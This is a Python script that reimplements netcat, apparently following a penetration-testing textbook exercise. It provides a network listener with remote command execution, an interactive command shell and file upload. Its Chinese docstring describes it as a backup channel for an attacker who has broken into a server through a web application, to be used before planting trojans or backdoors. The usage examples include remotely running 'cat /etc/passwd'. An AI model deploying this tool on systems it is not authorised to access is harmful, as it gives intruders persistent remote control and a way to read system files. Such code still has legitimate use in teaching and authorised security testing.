import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

"""
取代netcat:
netcat工具对于闯入系统的攻击者来说是不错的资源。
可以用它在网络环境中任意读/写数据，能远程执行命令，四处传送文件，甚至留下一个远程shell
但很多服务器没装netcat，但却默认装了python。
如果你通过某个web应用攻入了系统，那么在玩炸自己的某个木马或后门前，先反弹一个python会话作为备用通道是个不错的选择。
"""


def execute(cmd):
    """
    本机运行一条命令，并返回结果
    :param cmd: 命令
    :return: 结果
    """
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def handle(self, client_socket):
        """
        上传文件、执行命令、创建交互式命令行等
        :param client_socket:
        :return:
        """
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'yinlei: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

    def listen(self):
        """
        接收方
        :return:
        """
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def send(self):
        """
        发送方
        :return:
        """
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()


if __name__ == '__main__':
    # 解析命令行参数并调用其他func
    parser = argparse.ArgumentParser(
        description='yinlei network tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            cus_netcat.py -t 192.168.101.106 -p 5555 -l -c # command shell
            cus_netcat.py -t 192.168.101.106 -p 5555 -l -u=mytest.txt # upload to file
            cus_netcat.py -t 192.168.101.106 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
            echo 'ABC' | ./cus_netcat.py -t 192.168.101.106 -p 135 # echo text to server port 135
            cus_netcat.py -t 192.168.101.106 -p 5555 # connect to server
        '''))
    # 打开一个交互式的命令行shell
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    # 执行一条命令
    parser.add_argument('-e', '--execute', help='execute specified command')
    # 创建一个监听器
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    # 指定要通信的端口
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    # 指定要通信的目标ip地址
    parser.add_argument('-t', '--target', default='192.168.101.106', help='specified IP')
    # 指定要上传的文件
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()
